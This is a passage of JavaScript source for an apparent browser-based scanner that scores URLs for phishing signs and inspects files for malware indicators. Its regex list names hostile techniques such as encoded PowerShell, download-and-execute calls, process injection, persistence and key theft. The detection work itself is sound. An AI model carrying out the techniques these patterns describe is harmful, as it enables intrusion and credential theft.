const $ = (s) => document.querySelector(s),
  esc = (s) =>
    String(s).replace(
      /[&<>"']/g,
      (c) =>
        ({
          "&": "&amp;",
          "<": "&lt;",
          ">": "&gt;",
          '"': "&quot;",
          "'": "&#39;",
        })[c],
    );
const CFG = { safeMax: 30, suspMax: 70 }; // configurable verdict thresholds
const hex = (b) =>
  [...new Uint8Array(b)].map((x) => x.toString(16).padStart(2, "0")).join("");
const hash = async (a, buf) => hex(await crypto.subtle.digest(a, buf));
const enc = new TextEncoder();
function entropy(s) {
  if (!s.length) return 0;
  const m = {};
  for (const c of s) m[c] = (m[c] || 0) + 1;
  return -Object.values(m).reduce(
    (a, n) => a + (n / s.length) * Math.log2(n / s.length),
    0,
  );
}
function bEnt(u) {
  if (!u.length) return 0;
  const c = new Array(256).fill(0);
  for (let i = 0; i < u.length; i++) c[u[i]]++;
  let e = 0;
  for (const n of c)
    if (n) {
      const p = n / u.length;
      e -= p * Math.log2(p);
    }
  return e;
}
function lev(a, b) {
  const d = Array.from({ length: a.length + 1 }, (_, i) => [i]);
  for (let j = 1; j <= b.length; j++) d[0][j] = j;
  for (let i = 1; i <= a.length; i++)
    for (let j = 1; j <= b.length; j++)
      d[i][j] = Math.min(
        d[i - 1][j] + 1,
        d[i][j - 1] + 1,
        d[i - 1][j - 1] + (a[i - 1] === b[j - 1] ? 0 : 1),
      );
  return d[a.length][b.length];
}
const verdictOf = (s) =>
  s <= CFG.safeMax ? "Safe" : s <= CFG.suspMax ? "Suspicious" : "Malicious";

/* ---------- IPv4 parsing (standard + decimal/hex/octal encodings) ---------- */
function parseIPv4(str) {
  const p = str.split(".");
  if (p.length < 1 || p.length > 4) return null;
  const v = [];
  let encd = p.length !== 4;
  for (const x of p) {
    let n;
    if (/^0x[0-9a-f]+$/i.test(x)) {
      n = parseInt(x, 16);
      encd = true;
    } else if (/^0[0-7]+$/.test(x)) {
      n = parseInt(x, 8);
      encd = true;
    } else if (/^(0|[1-9]\d*)$/.test(x)) n = parseInt(x, 10);
    else return null;
    v.push(n);
  }
  const last = v.pop();
  if (last >= Math.pow(256, 4 - v.length) || v.some((n) => n > 255))
    return null;
  let val = 0;
  v.forEach((n) => (val = val * 256 + n));
  val = val * Math.pow(256, 4 - v.length) + last;
  return {
    o: [24, 16, 8, 0].map((s) => Math.floor(val / Math.pow(2, s)) % 256),
    enc: encd,
    val,
  };
}
function ipScope(o) {
  const [a, b] = o;
  if (a === 0) return ["This-network / unspecified (0.0.0.0/8)", "Medium"];
  if (a === 127) return ["Loopback (127.0.0.0/8)", "Low"];
  if (a === 10 || (a === 172 && b >= 16 && b <= 31) || (a === 192 && b === 168))
    return ["Private network (RFC 1918)", "Low"];
  if (a === 100 && b >= 64 && b <= 127)
    return ["Carrier-grade NAT (100.64.0.0/10)", "Low"];
  if (a === 169 && b === 254)
    return ["Link-local / APIPA (169.254.0.0/16)", "Medium"];
  if (
    (a === 192 && b === 0 && o[2] === 2) ||
    (a === 198 && b === 51 && o[2] === 100) ||
    (a === 203 && b === 0 && o[2] === 113)
  )
    return ["Documentation range (TEST-NET)", "Low"];
  if (a >= 224 && a <= 239) return ["Multicast (224.0.0.0/4)", "Medium"];
  if (a >= 240) return ["Reserved / broadcast (240.0.0.0/4)", "High"];
  return ["Public, globally routable", "Low"];
}

/* ---------- URL analyzer ---------- */
const BRANDS = [
  "paypal",
  "amazon",
  "google",
  "microsoft",
  "apple",
  "facebook",
  "netflix",
  "instagram",
  "whatsapp",
  "linkedin",
  "dropbox",
  "paytm",
  "hdfc",
  "icici",
  "sbi",
  "flipkart",
  "github",
  "outlook",
  "office365",
];
const KW = [
  "login",
  "signin",
  "verify",
  "secure",
  "update",
  "account",
  "bank",
  "password",
  "wallet",
  "confirm",
  "free",
  "bonus",
  "invoice",
  "support",
  "billing",
  "suspend",
  "unlock",
];
const SHORT = [
  "bit.ly",
  "tinyurl.com",
  "t.co",
  "goo.gl",
  "is.gd",
  "ow.ly",
  "cutt.ly",
  "rb.gy",
  "shorturl.at",
  "tiny.cc",
];
const BADTLD = [
  "tk",
  "ml",
  "ga",
  "cf",
  "gq",
  "xyz",
  "top",
  "click",
  "zip",
  "mov",
  "work",
  "country",
  "kim",
  "loan",
  "icu",
  "cyou",
];
const BADEXT = [
  "exe",
  "zip",
  "apk",
  "scr",
  "js",
  "bat",
  "cmd",
  "msi",
  "vbs",
  "ps1",
  "jar",
  "hta",
  "lnk",
  "rar",
  "dll",
];
const SLD = ["co", "com", "org", "net", "gov", "ac", "edu"];
const safeDec = (s) => {
  try {
    return decodeURIComponent(s);
  } catch {
    return s;
  }
};

function analyzeURL(input) {
  let s = input
    .trim()
    .replace(/^hxxp/i, "http")
    .replace(/\[\.\]/g, ".");
  if (!s) throw "Enter a URL to analyze.";
  if (/\s/.test(s)) throw "The URL contains spaces. Remove them and try again.";
  const R = [],
    S = [];
  let pts = 0;
  const add = (sev, p, title, text, spans) => {
    R.push({ sev, title, text });
    pts += p;
    (spans || []).forEach((x) => S.push({ a: x[0], b: x[1], sev, msg: title }));
  };
  const sch = s.match(/^(javascript|data|vbscript):/i);
  if (sch) {
    add(
      "High",
      60,
      "Script/data scheme",
      '"' +
        sch[1].toLowerCase() +
        ':" URLs run code or embed content in the browser instead of loading a remote page.',
      [[0, sch[0].length]],
    );
    return finishURL(
      s,
      {
        scheme: sch[1],
        host: "",
        rd: "",
        sub: "",
        tld: "",
        port: "",
        path: "",
        query: "",
        frag: "",
        user: "",
        ext: "",
      },
      R,
      S,
      Math.min(100, pts),
      [],
      false,
    );
  }
  const hadScheme = /^[a-z][a-z0-9+.-]*:\/\//i.test(s);
  if (!hadScheme) s = "http://" + s;
  const m = s.match(
    /^([a-z][a-z0-9+.-]*):\/\/([^\/?#]*)([^?#]*)(\?[^#]*)?(#.*)?$/i,
  );
  if (!m || !m[2])
    throw "This does not look like a valid URL. Expected something like https://example.com/path.";
  const scheme = m[1].toLowerCase(),
    auth = m[2],
    path = m[3] || "",
    query = m[4] || "",
    frag = m[5] || "";
  const aS = scheme.length + 3,
    at = auth.lastIndexOf("@"),
    user = at >= 0 ? auth.slice(0, at) : "",
    hp = auth.slice(at + 1),
    hS = aS + at + 1;
  const pm = hp.match(/:(\d+)$/),
    port = pm ? pm[1] : "",
    host = (pm ? hp.slice(0, -pm[0].length) : hp).toLowerCase();
  if (!host) throw "The URL has no host name.";
  const low = s.toLowerCase(),
    dec = safeDec(safeDec(low)),
    pS = aS + auth.length,
    qS = pS + path.length;
  const lab = host.split(".");
  let n = 2;
  if (
    lab.length >= 3 &&
    SLD.includes(lab[lab.length - 2]) &&
    lab[lab.length - 1].length === 2
  )
    n = 3;
  const rd = lab.slice(-n).join("."),
    sub = lab.slice(0, -n).join("."),
    tld = lab.slice(-n + 1).join(".") || lab[lab.length - 1];
  const ext =
    ((path.split("/").pop() || "").match(/\.([a-z0-9]{1,5})$/i) ||
      [])[1]?.toLowerCase() || "";
  const P = { scheme, user, host, sub, rd, tld, port, path, query, frag, ext };
  const ip = parseIPv4(host);
  // protocol
  if (scheme !== "https")
    add(
      "Low",
      10,
      "No HTTPS",
      "Traffic to this site is not encrypted (" +
        scheme +
        "). Credentials or data could be intercepted.",
      [[0, scheme.length]],
    );
  if (user)
    add(
      "High",
      30,
      'Embedded credentials / "@" trick',
      'Everything before "@" is user info, so the real host is "' +
        host +
        '". Attackers put a trusted-looking name first to deceive readers.',
      [[aS, aS + at + 1]],
    );
  // host
  if (ip) {
    const bad = ip.enc;
    add(
      bad ? "High" : "Medium",
      bad ? 35 : 25,
      bad ? "Obfuscated IP address" : "IP address instead of domain",
      bad
        ? 'The host is an IP written in decimal/hex/octal or short form ("' +
            host +
            '" = ' +
            ip.o.join(".") +
            "). This hides the destination from casual inspection."
        : "Legitimate services rarely use a bare IP. This is common in phishing kits and malware hosts.",
      [[hS, hS + host.length]],
    );
  } else {
    if (host.includes("xn--") || /[^\x00-\x7f]/.test(host))
      add(
        "High",
        28,
        "Punycode / homograph host",
        'Internationalized characters can mimic Latin letters (e.g. Cyrillic "a") to impersonate a brand.',
        [[hS, hS + host.length]],
      );
    if (SHORT.includes(rd))
      add(
        "Medium",
        15,
        "URL shortener",
        "The real destination is hidden behind a redirect service.",
        [[hS, hS + host.length]],
      );
    if (BADTLD.includes(tld))
      add(
        "Medium",
        15,
        "Suspicious or free TLD",
        '".' +
          tld +
          '" is cheap or free and heavily abused for throwaway phishing domains.',
        [[hS + host.length - tld.length - 1, hS + host.length]],
      );
    if (sub && sub.split(".").length >= 3)
      add(
        "Medium",
        10,
        "Deep subdomain nesting",
        sub.split(".").length +
          " subdomain levels are used to push the real domain out of view.",
        [[hS, hS + sub.length]],
      );
    if ((host.match(/-/g) || []).length >= 3)
      add(
        "Low",
        8,
        "Many hyphens in host",
        'Hyphen-stuffed names ("secure-login-account-...") are typical of generated phishing domains.',
      );
    if (entropy(lab[0]) > 3.6 && lab[0].length > 10)
      add(
        "Low",
        8,
        "Random-looking domain",
        "High character entropy (" +
          entropy(lab[0]).toFixed(2) +
          ") suggests an algorithmically generated name.",
        [[hS, hS + lab[0].length]],
      );
    // brand logic
    const rdl = rd.split(".")[0];
    for (const b of BRANDS) {
      if (rdl === b) continue;
      const subIdx = sub.indexOf(b),
        pathIdx = low.indexOf(b, pS);
      const unleet = rdl
          .replace(/0/g, "o")
          .replace(/1/g, "l")
          .replace(/3/g, "e")
          .replace(/5/g, "s")
          .replace(/@/g, "a"),
        un2 = rdl.replace(/1/g, "i").replace(/0/g, "o");
      if (unleet === b || un2 === b) {
        add(
          "High",
          38,
          'Character substitution of "' + b + '"',
          '"' +
            rdl +
            '" swaps look-alike characters (0/o, 1/l) to imitate ' +
            b +
            ".",
          [[hS + host.indexOf(rdl), hS + host.indexOf(rdl) + rdl.length]],
        );
        break;
      }
      if (
        rdl.length >= 4 &&
        lev(rdl, b) <= 2 &&
        rdl !== b &&
        Math.abs(rdl.length - b.length) <= 2
      ) {
        add(
          "High",
          35,
          'Typosquatting of "' + b + '"',
          '"' +
            rdl +
            '" is only ' +
            lev(rdl, b) +
            ' edit(s) away from "' +
            b +
            '".',
          [[hS + host.indexOf(rdl), hS + host.indexOf(rdl) + rdl.length]],
        );
        break;
      }
      if (rdl.includes(b)) {
        add(
          "High",
          28,
          'Combosquatting: "' + b + '" + extra words',
          'The registered domain "' +
            rd +
            '" contains "' +
            b +
            '" but is not the official domain.',
          [[hS + host.indexOf(rdl), hS + host.indexOf(rdl) + rdl.length]],
        );
        break;
      }
      if (subIdx >= 0) {
        add(
          "High",
          30,
          "Brand name in subdomain",
          '"' +
            b +
            '" appears in the subdomain, but the registered domain is "' +
            rd +
            '".',
          [[hS + subIdx, hS + subIdx + b.length]],
        );
        break;
      }
      if (pathIdx >= 0) {
        add(
          "Medium",
          18,
          "Brand name in path",
          '"' +
            b +
            '" appears in the path of an unrelated domain ("' +
            rd +
            '").',
          [[pathIdx, pathIdx + b.length]],
        );
        break;
      }
    }
  }
  if (port && !["80", "443"].includes(port))
    add(
      "Medium",
      10,
      "Non-standard port",
      "Port " + port + " is unusual for public websites.",
      [[hS + host.length, hS + host.length + port.length + 1]],
    );
  // keywords
  const kws = KW.filter((k) => low.includes(k));
  if (kws.length) {
    const sp = [];
    kws.forEach((k) => {
      let i = low.indexOf(k, aS);
      if (i >= 0) sp.push([i, i + k.length]);
    });
    add(
      kws.length >= 3 ? "Medium" : "Low",
      Math.min(24, kws.length * 6),
      "Sensitive keywords: " + kws.join(", "),
      "Words that lure users into entering credentials or payment details.",
      sp,
    );
  }
  // length / chars
  if (s.length > 120)
    add(
      "Medium",
      12,
      "Very long URL",
      s.length + " characters; long URLs hide the real host or payload.",
    );
  else if (s.length > 75) add("Low", 6, "Long URL", s.length + " characters.");
  if (
    /%25[0-9a-f]{2}/i.test(low) ||
    (safeDec(low) !== low && /%[0-9a-f]{2}/i.test(safeDec(low)))
  )
    add(
      "Medium",
      15,
      "Double encoding",
      "The URL is percent-encoded more than once, a common filter-evasion trick.",
    );
  else if (
    /%[0-9a-f]{2}/i.test(low) &&
    safeDec(low) !== low &&
    /[\/\\@.]/.test(safeDec(low).replace(low, ""))
  )
    add(
      "Low",
      5,
      "Percent-encoding present",
      "Encoded characters can hide parts of the real address.",
    );
  const b64 = low.slice(pS).match(/[a-z0-9+\/=]{28,}/i);
  if (b64)
    add(
      "Low",
      10,
      "Long Base64/hex-like string",
      "An opaque blob in the path or query can carry encoded payloads or tokens.",
      [
        [
          pS + low.slice(pS).indexOf(b64[0]),
          pS + low.slice(pS).indexOf(b64[0]) + b64[0].length,
        ],
      ],
    );
  const rp = query.match(
    /[?&](redirect|redirect_uri|url|next|return|goto|dest|continue|link)=([^&]*)/i,
  );
  if (rp) {
    const st = qS + query.indexOf(rp[0]) + 1;
    add(
      "Medium",
      14,
      "Open-redirect parameter",
      '"' +
        rp[1] +
        '" can forward victims to another site after trust is established.',
      [[st, st + rp[0].length - 1]],
    );
  }
  if (
    BADEXT.includes(ext) ||
    BADEXT.includes(
      (safeDec(dec).match(/\.([a-z0-9]{2,4})(?:[?#&]|$)/i) || [])[1] || "",
    )
  ) {
    const e = ext || "?";
    const i = low.lastIndexOf("." + ext);
    add(
      "High",
      25,
      "Risky file extension (." + e + ")",
      "The link points to a downloadable " +
        (ext === "js" ? "script" : "executable or archive") +
        ".",
      ext && i > 0 ? [[i, i + ext.length + 1]] : [],
    );
  }
  return finishURL(s, P, R, S, Math.min(100, pts), [], !!ip, {
    ip,
    entropy: entropy(host),
    low,
  });
}
function finishURL(s, P, R, S, score, _, isIP, x = {}) {
  const feats = [];
  const f = (n, v, r) => feats.push([n, v, r || "Low"]);
  const cnt = (c) => s.split(c).length - 1;
  f(
    "URL length",
    s.length,
    s.length > 120 ? "High" : s.length > 75 ? "Medium" : "Low",
  );
  f("Host length", P.host.length, P.host.length > 30 ? "Medium" : "Low");
  f("Dots", cnt("."), cnt(".") > 5 ? "Medium" : "Low");
  f("Hyphens", cnt("-"), cnt("-") > 3 ? "Medium" : "Low");
  f(
    "Digits",
    (s.match(/\d/g) || []).length,
    (s.match(/\d/g) || []).length > 10 ? "Medium" : "Low",
  );
  f('"@" symbols', cnt("@"), cnt("@") ? "High" : "Low");
  f('"%" symbols', cnt("%"), cnt("%") > 2 ? "Medium" : "Low");
  f(
    '"?" / "=" / "&"',
    cnt("?") + " / " + cnt("=") + " / " + cnt("&"),
    cnt("&") > 4 ? "Medium" : "Low",
  );
  const letters = (s.match(/[a-z]/gi) || []).length || 1,
    dg = (s.match(/\d/g) || []).length;
  f(
    "Digit-to-letter ratio",
    (dg / letters).toFixed(2),
    dg / letters > 0.4 ? "Medium" : "Low",
  );
  const sp = (s.match(/[^a-z0-9]/gi) || []).length;
  f(
    "Special-character ratio",
    (sp / s.length).toFixed(2),
    sp / s.length > 0.35 ? "Medium" : "Low",
  );
  f(
    "Shannon entropy",
    entropy(s).toFixed(2),
    entropy(s) > 4.5 ? "Medium" : "Low",
  );
  f(
    "Subdomain depth",
    P.sub ? P.sub.split(".").length : 0,
    P.sub && P.sub.split(".").length >= 3 ? "Medium" : "Low",
  );
  f("Path depth", P.path.split("/").filter(Boolean).length, "Low");
  f("IP used as host", isIP ? "yes" : "no", isIP ? "High" : "Low");
  f(
    "Port",
    P.port || "default",
    P.port && !["80", "443"].includes(P.port) ? "Medium" : "Low",
  );
  f("Protocol", P.scheme, P.scheme === "https" ? "Low" : "Medium");
  const m = R.map((r) => r.title.toLowerCase());
  return {
    kind: "url",
    text: s,
    parsed: P,
    reasons: R,
    spans: S,
    score,
    features: feats,
    category:
      R.some((r) =>
        /brand|squat|substitution|credentials|keywords/i.test(r.title),
      ) && score > 30
        ? "Phishing"
        : R.some((r) => /extension|script/i.test(r.title))
          ? "Malware distribution"
          : R.some((r) => /shortener|redirect|TLD/i.test(r.title)) && score > 30
            ? "Scam / redirect"
            : "None detected",
    brand:
      (
        R.find(
          (r) =>
            /"([a-z0-9]+)"/.test(r.title) &&
            /squat|substitution|subdomain|path/i.test(r.title),
        ) || {}
      ).title?.match(/"([a-z0-9]+)"/)?.[1] || "",
  };
}

/* ---------- File analyzer ---------- */
const MAGIC = [
  [[0x4d, 0x5a], "exe", "Windows PE executable (MZ)"],
  [[0x7f, 0x45, 0x4c, 0x46], "elf", "ELF executable"],
  [[0x25, 0x50, 0x44, 0x46], "pdf", "PDF document"],
  [[0x50, 0x4b, 3, 4], "zip", "ZIP archive (or OOXML/JAR/APK)"],
  [[0x50, 0x4b, 5, 6], "zip", "ZIP archive (empty)"],
  [[0x89, 0x50, 0x4e, 0x47], "png", "PNG image"],
  [[0xff, 0xd8, 0xff], "jpeg", "JPEG image"],
  [[0x47, 0x49, 0x46, 0x38], "gif", "GIF image"],
  [[0x1f, 0x8b], "gzip", "GZIP archive"],
  [[0x52, 0x61, 0x72, 0x21], "rar", "RAR archive"],
  [[0x37, 0x7a, 0xbc, 0xaf], "7z", "7-Zip archive"],
  [[0xd0, 0xcf, 0x11, 0xe0], "ole", "OLE2 (legacy Office; may hold macros)"],
];
const EXTOK = {
  exe: ["exe", "dll", "scr", "sys", "ocx", "cpl"],
  elf: ["elf", "so", "bin", "out", ""],
  pdf: ["pdf"],
  zip: ["zip", "jar", "apk", "docx", "xlsx", "pptx", "odt", "ods"],
  png: ["png"],
  jpeg: ["jpg", "jpeg"],
  gif: ["gif"],
  gzip: ["gz", "tgz"],
  rar: ["rar"],
  "7z": ["7z"],
  ole: ["doc", "xls", "ppt", "msi"],
};
const PATS = [
  [
    /powershell(\.exe)?\s+.{0,40}-(enc|e|encodedcommand)\b/i,
    "High",
    22,
    "Encoded PowerShell command",
    "Base64-encoded PowerShell is a standard way to hide malicious scripts.",
  ],
  [
    /\b(Invoke-Expression|IEX\s*\(|DownloadString|Invoke-WebRequest|Net\.WebClient)/i,
    "High",
    20,
    "PowerShell download/exec",
    "Downloads and runs code from the network.",
  ],
  [
    /\b(WScript\.Shell|Scripting\.FileSystemObject|ActiveXObject|CreateObject\s*\()/i,
    "High",
    20,
    "Windows scripting host objects",
    "Commonly used by droppers to run commands or write files.",
  ],
  [
    /\bcmd(\.exe)?\s*\/c\b/i,
    "Medium",
    12,
    "Command shell execution",
    "Runs shell commands.",
  ],
  [
    /\beval\s*\(|\bFunction\s*\(\s*['"]return|String\.fromCharCode\s*\(|\batob\s*\(|unescape\s*\(/i,
    "Medium",
    14,
    "JavaScript obfuscation / dynamic eval",
    "Hides or builds code at runtime.",
  ],
  [
    /document\.write\s*\(\s*unescape|<iframe[^>]+(width|height)\s*=\s*["']?0/i,
    "High",
    20,
    "Hidden iframe / injected markup",
    "Zero-size iframes load attacker content invisibly.",
  ],
  [
    /<script[^>]*>/i,
    "Low",
    5,
    "Embedded <script> tag",
    "Active content inside the file.",
  ],
  [
    /(\bVirtualAlloc(Ex)?\b|WriteProcessMemory|CreateRemoteThread|NtUnmapViewOfSection|SetWindowsHookEx)/,
    "High",
    22,
    "Process-injection APIs",
    "Imports used to inject code into other processes.",
  ],
  [
    /(URLDownloadToFile|InternetOpenUrl|WinHttpOpen|WSAStartup)/,
    "Medium",
    12,
    "Network/download APIs",
    "The program can fetch data or payloads from the network.",
  ],
  [
    /(IsDebuggerPresent|CheckRemoteDebuggerPresent|VirtualBox|VMware|SbieDll)/,
    "Medium",
    10,
    "Anti-analysis checks",
    "Looks for debuggers or sandboxes.",
  ],
  [
    /(RegSetValueEx|CurrentVersion\\Run|schtasks|startup\b)/i,
    "Medium",
    10,
    "Persistence mechanism",
    "Can survive reboots.",
  ],
  [
    /\/(JavaScript|JS)\b/,
    "High",
    22,
    "PDF JavaScript",
    "PDFs rarely need scripts; this is a frequent exploit vector.",
  ],
  [
    /\/(OpenAction|AA)\b/,
    "Medium",
    12,
    "PDF auto-action",
    "Runs something automatically when opened.",
  ],
  [
    /\/Launch\b/,
    "High",
    25,
    "PDF /Launch action",
    "Can start external programs.",
  ],
  [
    /\/EmbeddedFile\b/,
    "Medium",
    12,
    "PDF embedded file",
    "Carries another file inside.",
  ],
  [
    /AutoOpen|Document_Open|Workbook_Open|vbaProject\.bin/i,
    "High",
    22,
    "Office macro auto-run",
    "Macros that run when the document opens.",
  ],
  [
    /(-----BEGIN (RSA |EC )?PRIVATE KEY-----|AKIA[0-9A-Z]{16})/,
    "High",
    20,
    "Leaked secret / key",
    "Private key or AWS access key found in file.",
  ],
];
const ctx = (L, i, len) => {
  const a = Math.max(0, i - 25),
    b = Math.min(L.length, i + len + 25);
  return L.slice(a, b).replace(/[^\x20-\x7e]/g, "·");
};
const lineOf = (L, i) => {
  let n = 1;
  for (let k = 0; k < i; k++) if (L.charCodeAt(k) === 10) n++;
  return n;
};

async function analyzeFile(file) {
  if (file.size > 50 * 1024 * 1024)
    throw "This demo handles files up to 50 MB.";
  const buf = await file.arrayBuffer(),
    u = new Uint8Array(buf),
    dv = new DataView(buf);
  const R = [],
    ev = [],
    extra = [];
  let pts = 0;
  const add = (sev, p, t, x) => {
    R.push({ sev, title: t, text: x });
    pts += p;
  };
  const name = file.name,
    ext = (name.match(/\.([^.]+)$/) || [])[1]?.toLowerCase() || "";
  let type = null,
    tdesc = "Text / unknown";
  for (const [mg, t, d] of MAGIC)
    if (mg.every((b, i) => u[i] === b)) {
      type = t;
      tdesc = d;
      break;
    }
  const head = u.subarray(0, Math.min(u.length, 4 * 1024 * 1024));
  let L = "";
  for (let i = 0; i < head.length; i += 60000)
    L += String.fromCharCode.apply(null, head.subarray(i, i + 60000));
  let bin = 0;
  for (let i = 0; i < Math.min(head.length, 8000); i++) {
    const c = head[i];
    if (c < 9 || (c > 13 && c < 32)) bin++;
  }
  const isText = !type && bin / Math.min(head.length || 1, 8000) < 0.05;
  if (isText) tdesc = "Plain text / script / markup";
  const ent = bEnt(head);
  // type vs extension
  if (type && !(EXTOK[type] || []).includes(ext))
    add(
      "High",
      35,
      "File type does not match extension",
      "Contents are " +
        tdesc +
        ' but the name ends in ".' +
        (ext || "none") +
        '". Disguising executables as documents or images is a classic delivery trick.',
    );
  if (
    isText &&
    ["exe", "dll", "jpg", "jpeg", "png", "pdf", "gif"].includes(ext)
  )
    add(
      "High",
      30,
      'Text disguised as ".' + ext + '"',
      "No " + ext.toUpperCase() + " header present; the file is plain text.",
    );
  if (/\.(pdf|doc|docx|jpg|png|txt|xls)\.(exe|scr|bat|js|vbs|cmd)$/i.test(name))
    add(
      "High",
      30,
      "Double extension",
      '"' + name + '" hides its real, executable extension.',
    );
  if (
    !type &&
    [
      "bat",
      "cmd",
      "ps1",
      "vbs",
      "js",
      "hta",
      "lnk",
      "msi",
      "jar",
      "apk",
      "com",
    ].includes(ext)
  )
    add(
      "Medium",
      15,
      "Risky script/package extension",
      '".' + ext + '" files execute code when opened.',
    );
  if (type === "exe" || type === "elf")
    add(
      "Medium",
      22,
      "Executable program",
      "Native code can do anything the user can. Never run it unless it comes from a trusted, verified source.",
    );
  if (
    ent > 7.4 &&
    !["zip", "jpeg", "png", "gzip", "rar", "7z", "gif"].includes(type)
  )
    add(
      "Medium",
      16,
      "Very high entropy (" + ent.toFixed(2) + "/8)",
      "Indicates packing, encryption or embedded compressed payloads, which hide the real code from scanners.",
    );
  // PE
  if (type === "exe" && u.length > 0x100) {
    const pe = dv.getUint32(0x3c, true);
    if (pe + 24 < u.length && dv.getUint32(pe, true) === 0x4550) {
      const ns = dv.getUint16(pe + 6, true),
        ts = dv.getUint32(pe + 8, true),
        osz = dv.getUint16(pe + 20, true),
        ch = dv.getUint16(pe + 22, true);
      const rows = [];
      let packed = 0;
      for (let i = 0; i < Math.min(ns, 24); i++) {
        const o = pe + 24 + osz + i * 40;
        if (o + 40 > u.length) break;
        let nm = "";
        for (let k = 0; k < 8 && u[o + k]; k++)
          nm += String.fromCharCode(u[o + k]);
        const rs = dv.getUint32(o + 16, true),
          rp = dv.getUint32(o + 20, true),
          e =
            rs && rp + rs <= u.length
              ? bEnt(u.subarray(rp, rp + Math.min(rs, 1 << 20)))
              : 0;
        if (e > 7) packed++;
        rows.push([
          nm,
          rs,
          e.toFixed(2),
          e > 7 ? "High" : e > 6.5 ? "Medium" : "Low",
        ]);
      }
      extra.push({
        title: "PE sections",
        head: ["Name", "Raw size", "Entropy", "Risk"],
        rows,
      });
      const d = ts ? new Date(ts * 1000) : null;
      if (d && (d.getFullYear() < 1995 || d > new Date()))
        add(
          "Medium",
          10,
          "Forged compile timestamp",
          "Timestamp " +
            d.toISOString().slice(0, 10) +
            " is impossible or in the future.",
        );
      if (packed)
        add(
          "High",
          20,
          packed + " packed section(s)",
          "Sections with entropy above 7 usually hold compressed or encrypted code (packers/crypters).",
        );
      if (rows.some((r) => /upx|\.?(themida|vmp|aspack|petite)/i.test(r[0])))
        add(
          "High",
          20,
          "Known packer section names",
          "Packers are common in malware to evade signatures.",
        );
      extra.unshift({
        title: "PE header",
        head: ["Field", "Value"],
        rows: [
          [
            "Machine",
            dv.getUint16(pe + 4, true) === 0x8664
              ? "x64"
              : dv.getUint16(pe + 4, true) === 0x14c
                ? "x86"
                : "0x" + dv.getUint16(pe + 4, true).toString(16),
          ],
          ["Sections", ns],
          ["Compiled", d ? d.toISOString() : "n/a"],
          ["Type", ch & 0x2000 ? "DLL" : "EXE"],
        ],
      });
    }
  }
  // ZIP listing
  if (type === "zip") {
    const names = [];
    let enc2 = false;
    const lim = Math.min(u.length, 16 * 1024 * 1024);
    for (let i = 0; i < lim - 46 && names.length < 300; i++)
      if (
        u[i] === 0x50 &&
        u[i + 1] === 0x4b &&
        u[i + 2] === 1 &&
        u[i + 3] === 2
      ) {
        const fl = dv.getUint16(i + 8, true),
          nl = dv.getUint16(i + 28, true),
          sz = dv.getUint32(i + 24, true);
        if (i + 46 + nl > u.length) break;
        const nm = new TextDecoder().decode(u.subarray(i + 46, i + 46 + nl));
        if (fl & 1) enc2 = true;
        names.push([nm, sz]);
        i += 45;
      }
    const rows = names.slice(0, 60).map(([n, z]) => {
      const e = (n.match(/\.([^.\/]+)$/) || [])[1]?.toLowerCase() || "";
      const r = [
        "exe",
        "scr",
        "dll",
        "bat",
        "cmd",
        "vbs",
        "js",
        "jar",
        "ps1",
        "hta",
        "lnk",
      ].includes(e)
        ? "High"
        : ["zip", "rar", "7z"].includes(e)
          ? "Medium"
          : "Low";
      return [n, z, r];
    });
    extra.push({
      title: "Archive contents (" + names.length + " entries)",
      head: ["Entry", "Size", "Risk"],
      rows,
    });
    const ex = rows.filter((r) => r[2] === "High").length;
    if (ex)
      add(
        "High",
        25,
        ex + " executable/script file(s) inside archive",
        "Archives are used to smuggle programs past email filters.",
      );
    if (names.some(([n]) => /\.\.[\/\\]/.test(n)))
      add(
        "High",
        25,
        "Path traversal in entry names",
        'Entries containing "../" try to write outside the extraction folder (Zip-Slip).',
      );
    if (
      names.some(([n]) =>
        /\.(pdf|doc|docx|jpg|png)\.(exe|scr|bat|js)$/i.test(n),
      )
    )
      add(
        "High",
        20,
        "Double-extension entry",
        "A file inside pretends to be a document.",
      );
    if (enc2)
      add(
        "Medium",
        12,
        "Password-protected entries",
        "Encryption prevents mail gateways and AV from scanning the contents.",
      );
    if (names.some(([n]) => /\.(zip|rar|7z)$/i.test(n)))
      add(
        "Low",
        6,
        "Nested archive",
        "Archives inside archives are used to evade depth-limited scanners.",
      );
    if (names.some(([n]) => /vbaProject\.bin/i.test(n)))
      add("High", 22, "VBA macro project", "This Office file contains macros.");
  }
  // images
  if (type === "png" || type === "jpeg") {
    const rows = [];
    if (type === "png") {
      rows.push(["Dimensions", dv.getUint32(16) + " × " + dv.getUint32(20)]);
      const iend = L.lastIndexOf("IEND");
      if (iend > 0 && u.length - (iend + 8) > 16)
        add(
          "High",
          30,
          "Data appended after PNG end (" + (u.length - iend - 8) + " bytes)",
          "Extra bytes after IEND often hide a payload (steganography or polyglot).",
        );
    } else {
      let i = 2;
      while (i < u.length - 9) {
        if (u[i] !== 0xff) {
          i++;
          continue;
        }
        const mk = u[i + 1];
        if (mk >= 0xc0 && mk <= 0xc3) {
          rows.push([
            "Dimensions",
            dv.getUint16(i + 7) + " × " + dv.getUint16(i + 5),
          ]);
          break;
        }
        i += 2 + dv.getUint16(i + 2);
      }
      let e = u.length - 1;
      while (e > 1 && !(u[e - 1] === 0xff && u[e] === 0xd9)) e--;
      if (e > 1 && u.length - e > 16)
        add(
          "High",
          30,
          "Data appended after JPEG end (" + (u.length - e) + " bytes)",
          "Extra bytes after the EOI marker may hide a payload.",
        );
      if (/Exif/.test(L.slice(0, 100)))
        rows.push(["EXIF", "present (may contain GPS / device info)"]);
    }
    if (/<\?php|<script|MZ\x90\x00|eval\(/.test(L.slice(200)))
      add(
        "High",
        28,
        "Code embedded inside image",
        "Script or executable markers were found in the image body.",
      );
    extra.push({ title: "Image properties", head: ["Field", "Value"], rows });
  }
  // string/pattern evidence
  let apiHits = 0;
  for (const [re, sev, p, t, x] of PATS) {
    const g = new RegExp(
      re.source,
      re.flags.includes("g") ? re.flags : re.flags + "g",
    );
    const hits = [...L.matchAll(g)].slice(0, 4);
    if (!hits.length) continue;
    if (!(sev === "Low" && type === "exe")) {
      add(
        sev,
        Math.min(p, sev === "Medium" && ++apiHits > 3 ? 3 : p),
        t + (hits.length > 1 ? " (×" + hits.length + "+)" : ""),
        x,
      );
    }
    hits.forEach((h) =>
      ev.push({
        sev,
        t,
        off: h.index,
        line: lineOf(L, h.index),
        snip: ctx(L, h.index, h[0].length),
      }),
    );
  }
  // URLs & IPs
  const urls = [
    ...new Set(L.match(/\bhttps?:\/\/[^\s"'<>)\]\\]{4,200}/gi) || []),
  ].slice(0, 15);
  const urows = [];
  let bad = 0,
    sus = 0;
